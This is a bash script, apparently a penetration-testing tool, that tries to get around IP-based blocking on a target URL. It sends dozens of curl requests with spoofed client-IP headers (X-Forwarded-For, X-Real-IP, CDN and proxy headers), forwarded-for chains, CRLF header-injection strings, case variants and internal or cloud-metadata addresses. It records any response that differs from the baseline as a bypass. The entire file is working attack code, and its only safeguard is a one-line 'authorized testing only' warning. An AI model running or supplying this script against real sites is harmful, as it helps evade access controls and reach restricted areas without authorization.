#!/bin/bash
# IP Blocking Bypass via Header Manipulation
# Author: Hackexdecodebreaker (https://github.com/Hackexdecodebreaker)
# WARNING: For authorized testing only

figlet -f slant "IPBLOCK BYPASS"
toilet -f mono12 -F metal "Author: Hackexdecodebreaker"
toilet -f mono12 -F metal "GitHub: github.com/Hackexdecodebreaker"
echo ""

if [ $# -eq 0 ]; then
    echo "Usage: $0 <target-url>"
    echo "Example: $0 https://example.com"
    echo "         $0 https://example.com/admin"
    exit 1
fi

TARGET=$1
OUTDIR="ipblock_bypass_$(echo $TARGET | sed 's|https\?://||' | sed 's|/.*||')_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$OUTDIR"

echo "[+] IP Blocking Bypass Test on $TARGET"
echo "[+] Output directory: $OUTDIR"

# Baseline request
echo "[+] Baseline request..."
BASELINE=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET" 2>/dev/null)
echo "  Baseline: $BASELINE" | tee "$OUTDIR/baseline.txt"

# IP Spoofing Headers
echo "[+] Testing IP spoofing headers..."
HEADERS=(
    "X-Forwarded-For: 127.0.0.1"
    "X-Forwarded-For: 10.0.0.1"
    "X-Forwarded-For: 192.168.1.1"
    "X-Forwarded-For: 172.16.0.1"
    "X-Forwarded-For: 169.254.169.254"
    "X-Forwarded-For: 0.0.0.0"
    "X-Forwarded-For: ::1"
    "X-Forwarded-For: [::1]"
    "X-Forwarded-For: localhost"
    "X-Real-IP: 127.0.0.1"
    "X-Real-IP: 10.0.0.1"
    "Client-IP: 127.0.0.1"
    "Client-IP: 10.0.0.1"
    "True-Client-IP: 127.0.0.1"
    "True-Client-IP: 10.0.0.1"
    "X-Cluster-Client-IP: 127.0.0.1"
    "X-Forwarded: 127.0.0.1"
    "X-Forwarded-By: 127.0.0.1"
    "X-Forwarded-Server: 127.0.0.1"
    "X-Forwarded-Host: localhost"
    "X-Forwarded-Port: 80"
    "X-Forwarded-Proto: http"
    "X-Forwarded-Ssl: off"
    "CF-Connecting-IP: 127.0.0.1"
    "CF-Connecting-IPv6: ::1"
    "X-Original-Forwarded-For: 127.0.0.1"
)

for header in "${HEADERS[@]}"; do
    code=$(curl -s -o /dev/null -w "%{http_code}" -H "$header" "$TARGET" 2>/dev/null)
    if [ "$code" != "$BASELINE" ]; then
        echo "  [!] DIFFERENT: $header -> $code (baseline: $BASELINE)" | tee -a "$OUTDIR/bypass_success.txt"
    else
        echo "  $header -> $code" >> "$OUTDIR/all_results.txt"
    fi
done

# Multiple X-Forwarded-For values (chain)
echo "[+] Testing X-Forwarded-For chains..."
CHAINS=(
    "127.0.0.1, 10.0.0.1"
    "10.0.0.1, 127.0.0.1"
    "127.0.0.1, 192.168.1.1, 10.0.0.1"
    "127.0.0.1, 127.0.0.1"
    "10.0.0.1, 10.0.0.1"
    "192.168.1.1, 172.16.0.1, 10.0.0.1"
    "127.0.0.1, 169.254.169.254"
)
for chain in "${CHAINS[@]}"; do
    code=$(curl -s -o /dev/null -w "%{http_code}" -H "X-Forwarded-For: $chain" "$TARGET" 2>/dev/null)
    if [ "$code" != "$BASELINE" ]; then
        echo "  [!] DIFFERENT: X-Forwarded-For: $chain -> $code" | tee -a "$OUTDIR/bypass_success.txt"
    else
        echo "  X-Forwarded-For: $chain -> $code" >> "$OUTDIR/all_results.txt"
    fi
done

# Header injection variations
echo "[+] Testing header injection variations..."
INJECTIONS=(
    "X-Forwarded-For: 127.0.0.1\r\nX-Real-IP: 127.0.0.1"
    "X-Forwarded-For: 127.0.0.1\nX-Real-IP: 127.0.0.1"
    "X-Forwarded-For: 127.0.0.1%0d%0aX-Real-IP: 127.0.0.1"
)
for inj in "${INJECTIONS[@]}"; do
    code=$(curl -s -o /dev/null -w "%{http_code}" -H "$inj" "$TARGET" 2>/dev/null)
    if [ "$code" != "$BASELINE" ]; then
        echo "  [!] DIFFERENT: Header injection -> $code" | tee -a "$OUTDIR/bypass_success.txt"
    else
        echo "  Header injection -> $code" >> "$OUTDIR/all_results.txt"
    fi
done

# Case variations
echo "[+] Testing case variations..."
CASE_VARIANTS=(
    "x-forwarded-for: 127.0.0.1"
    "X-FORWARDED-FOR: 127.0.0.1"
    "x-Forwarded-For: 127.0.0.1"
    "X-forwarded-for: 127.0.0.1"
    "X-Real-Ip: 127.0.0.1"
    "x-real-ip: 127.0.0.1"
    "CLIENT-IP: 127.0.0.1"
    "client-ip: 127.0.0.1"
)
for variant in "${CASE_VARIANTS[@]}"; do
    code=$(curl -s -o /dev/null -w "%{http_code}" -H "$variant" "$TARGET" 2>/dev/null)
    if [ "$code" != "$BASELINE" ]; then
        echo "  [!] DIFFERENT: $variant -> $code" | tee -a "$OUTDIR/bypass_success.txt"
    else
        echo "  $variant -> $code" >> "$OUTDIR/all_results.txt"
    fi
done

# Cloudflare/Akamai/Fastly specific headers
echo "[+] Testing CDN-specific headers..."
CDN_HEADERS=(
    "CF-Connecting-IP: 127.0.0.1"
    "CF-IPCountry: US"
    "CF-RAY: test"
    "CF-Visitor: {\"scheme\":\"http\"}"
    "True-Client-IP: 127.0.0.1"
    "Fastly-Client-IP: 127.0.0.1"
    "Fastly-FF: 127.0.0.1"
    "Akamai-Origin-Hop: 127.0.0.1"
    "X-Akamai-Original-URL: /admin"
    "X-Akamai-Edgescape: country_code=US"
    "X-Forwarded-For: 127.0.0.1"
    "X-Forwarded-For: 127.0.0.1, 127.0.0.1"
)
for header in "${CDN_HEADERS[@]}"; do
    code=$(curl -s -o /dev/null -w "%{http_code}" -H "$header" "$TARGET" 2>/dev/null)
    if [ "$code" != "$BASELINE" ]; then
        echo "  [!] DIFFERENT: $header -> $code" | tee -a "$OUTDIR/bypass_success.txt"
    else
        echo "  $header -> $code" >> "$OUTDIR/all_results.txt"
    fi
done

# Proxy headers
echo "[+] Testing proxy headers..."
PROXY_HEADERS=(
    "Via: 1.1 proxy"
    "Via: 1.1 localhost"
    "Forwarded: for=127.0.0.1;by=proxy;host=localhost;proto=http"
    "Forwarded: for=\"[::1]\";proto=http"
    "X-Proxy-IP: 127.0.0.1"
    "X-Proxy-ID: proxy"
    "Proxy-Client-IP: 127.0.0.1"
    "WL-Proxy-Client-IP: 127.0.0.1"
    "HTTP_X_FORWARDED_FOR: 127.0.0.1"
    "HTTP_X_REAL_IP: 127.0.0.1"
    "HTTP_CLIENT_IP: 127.0.0.1"
)
for header in "${PROXY_HEADERS[@]}"; do
    code=$(curl -s -o /dev/null -w "%{http_code}" -H "$header" "$TARGET" 2>/dev/null)
    if [ "$code" != "$BASELINE" ]; then
        echo "  [!] DIFFERENT: $header -> $code" | tee -a "$OUTDIR/bypass_success.txt"
    else
        echo "  $header -> $code" >> "$OUTDIR/all_results.txt"
    fi
done

# IPv6 variations
echo "[+] Testing IPv6 variations..."
IPV6_HEADERS=(
    "X-Forwarded-For: ::1"
    "X-Forwarded-For: [::1]"
    "X-Forwarded-For: ::ffff:127.0.0.1"
    "X-Forwarded-For: 0:0:0:0:0:0:0:1"
    "X-Forwarded-For: 0000:0000:0000:0000:0000:0000:0000:0001"
    "X-Real-IP: ::1"
    "Client-IP: ::1"
)
for header in "${IPV6_HEADERS[@]}"; do
    code=$(curl -s -o /dev/null -w "%{http_code}" -H "$header" "$TARGET" 2>/dev/null)
    if [ "$code" != "$BASELINE" ]; then
        echo "  [!] DIFFERENT: $header -> $code" | tee -a "$OUTDIR/bypass_success.txt"
    else
        echo "  $header -> $code" >> "$OUTDIR/all_results.txt"
    fi
done

# Custom/internal IPs
echo "[+] Testing internal IP ranges..."
INTERNAL_IPS=(
    "10.0.0.1"
    "10.255.255.254"
    "172.16.0.1"
    "172.31.255.254"
    "192.168.0.1"
    "192.168.255.254"
    "169.254.169.254"
    "169.254.0.1"
    "127.0.0.1"
    "127.0.0.2"
    "127.255.255.254"
    "0.0.0.0"
    "255.255.255.255"
)
for ip in "${INTERNAL_IPS[@]}"; do
    code=$(curl -s -o /dev/null -w "%{http_code}" -H "X-Forwarded-For: $ip" "$TARGET" 2>/dev/null)
    if [ "$code" != "$BASELINE" ]; then
        echo "  [!] DIFFERENT: X-Forwarded-For: $ip -> $code" | tee -a "$OUTDIR/bypass_success.txt"
    else
        echo "  X-Forwarded-For: $ip -> $code" >> "$OUTDIR/all_results.txt"
    fi
done

# Summary
echo ""
echo "[+] IP Blocking Bypass Test Complete"
echo "[+] Results in $OUTDIR/"
if [ -f "$OUTDIR/bypass_success.txt" ]; then
    echo "[+] Potential bypasses found:"
    cat "$OUTDIR/bypass_success.txt"
else
    echo "[+] No bypasses detected (all responses matched baseline: $BASELINE)"
fi
echo "[+] All results saved to $OUTDIR/all_results.txt"
